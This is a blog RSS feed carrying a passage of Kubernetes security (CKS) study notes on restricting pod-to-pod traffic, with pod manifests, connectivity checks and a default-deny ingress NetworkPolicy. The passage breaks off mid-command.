<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>My New Hugo Site</title>
    <link>https://flowhero.github.io/newblog/</link>
    <description>Recent content on My New Hugo Site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 23 Aug 2024 23:17:59 +0100</lastBuildDate><atom:link href="https://flowhero.github.io/newblog/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CKS</title>
      <link>https://flowhero.github.io/newblog/posts/cks/</link>
      <pubDate>Fri, 23 Aug 2024 23:17:59 +0100</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/cks/</guid>
      <description>[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]] [[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]] [[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]] [[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]] [[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]] [[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]] [[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]] [[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]] [[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]] [[#Protecting GUI Elements|Protecting GUI Elements]] [[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]] [[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]] [[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]] [[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]] [[#Summary|Summary]] - [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]] - [[#Avoiding Insecure Configuration Arguments#Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities|Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]] !</description>
      <content>&lt;ul&gt;
&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]]
&lt;ul&gt;
&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]]&lt;/li&gt;
&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]]&lt;/li&gt;
&lt;li&gt;[[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]]
&lt;ul&gt;
&lt;li&gt;[[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]]&lt;/li&gt;
&lt;li&gt;[[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]]&lt;/li&gt;
&lt;li&gt;[[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]]&lt;/li&gt;
&lt;li&gt;[[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]]
&lt;ul&gt;
&lt;li&gt;[[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]]&lt;/li&gt;
&lt;li&gt;[[#Protecting GUI Elements|Protecting GUI Elements]]
&lt;ul&gt;
&lt;li&gt;[[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]]&lt;/li&gt;
&lt;li&gt;[[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]]&lt;/li&gt;
&lt;li&gt;[[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]]&lt;/li&gt;
&lt;li&gt;[[#Summary|Summary]]
- [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]]
- [[#Avoiding Insecure Configuration Arguments#Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities|Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities]]
- [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]]
- [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]]
- [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;![[Capture d’écran 2024-08-17 192014.png]]&lt;/p&gt;
&lt;h2 id=&#34;using-network-policies-to-restrict-pod-to-pod-communication&#34;&gt;Using Network Policies to Restrict Pod-to-Pod Communication&lt;/h2&gt;
&lt;p&gt;For a Microservice architecture to function in Kubernetes, a Pod needs to be able to communicate with another pod running on same or different node without NAT. Kubernetes assign IP to a pod upon creation from the pod CIDR range of its node, the IP is ephemeral (not stable overtime), every restart of a pod leases a new IP Address.
It&amp;rsquo;s recommended to use Pod-to-Service Communication over Pod-to-Pod communication so that you can rely on a consistent Network Interface.&lt;/p&gt;
&lt;p&gt;The IP of a pod is unique across different nodes and namespaces. This is achieved by assigning a dedicated subnet to every node when registering it.&lt;/p&gt;
&lt;p&gt;Newly created pod will then get an ip from the subnet of the node, this is handled by CNI plugin&lt;/p&gt;
&lt;p&gt;Pods on a node can communicate with all other pods running on any other node of the cluster.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://networkpolicy.io/&#34;&gt;https://networkpolicy.io/&lt;/a&gt; : Provide a visual editor for network policies that renders a graphical representation in the browser&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;attacker-gain-initial-access-to-a-pod&#34;&gt;Attacker gain initial access to a Pod&lt;/h3&gt;
&lt;p&gt;![[Capture d’écran 2024-08-17 193605.png]]&lt;/p&gt;
&lt;p&gt;Without defining Network Policies, Attacker can talk to all pods and cause additional damage.&lt;/p&gt;
&lt;h3 id=&#34;denying-directional-network-traffic&#34;&gt;Denying Directional Network Traffic&lt;/h3&gt;
&lt;p&gt;The best way to restrict Pod-to-Pod network traffic is with the principle of least privilege&lt;/p&gt;
&lt;p&gt;Setup the cluster on &lt;code&gt;ng04.yml&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Namespace&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;orion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bmuschko/nodejs-hello-world:1.0.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;hello&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;containerPort&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;alpine&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;/bin/sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - -&lt;span style=&#34;color:#ae81ff&#34;&gt;c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;while true; do sleep 5; done;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;outside&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;other&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;alpine&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;other&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;/bin/sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - -&lt;span style=&#34;color:#ae81ff&#34;&gt;c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;while true; do sleep 5; done;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f ng04.yml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Verify that the pods are up and running:&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 222913.png]]&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 222953.png]]&lt;/p&gt;
&lt;p&gt;The cluster have 2 pods on g04 namespace and a pod on default namespace.
By default communication is allowed between these pods, even though the namespace is different.&lt;/p&gt;
&lt;p&gt;To test the connectivity from frontend to backend:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec frontend -it -n g04 -- /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote file exists
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;same applies from other to backend:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec other -it -- /bin/sh 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote file exists 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s now apply the default deny all ingress traffic policy.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-deny-all&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  podSelector&lt;/span&gt;: {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  policyTypes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;  - Ingress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Selecting all Pods is denoted by the value &lt;code&gt;{}&lt;/code&gt; assigned to the &lt;code&gt;spec.podSelector&lt;/code&gt; attribute. The value attribute &lt;code&gt;spec.policyTypes&lt;/code&gt; defines the denied direction of traffic. For incoming traffic, you can add &lt;em&gt;Ingress&lt;/em&gt; to the array. Outgoing traffic can be specified by the value &lt;em&gt;Egress&lt;/em&gt;. In this particular example, we disallow all ingress traffic. Egress traffic is still permitted.&lt;/p&gt;
&lt;p&gt;You’d usually start by disallowing traffic in any direction and then opening up the traffic needed by the application architecture.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f deny-all-ingress-network-policy.yaml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;networkpolicy.networking.k8s.io/default-deny-ingress created
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Pod-to-pod connectivity is now denied:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec frontend -it -n g04 -- /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget: download timed out
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec other -it -- /bin/sh 
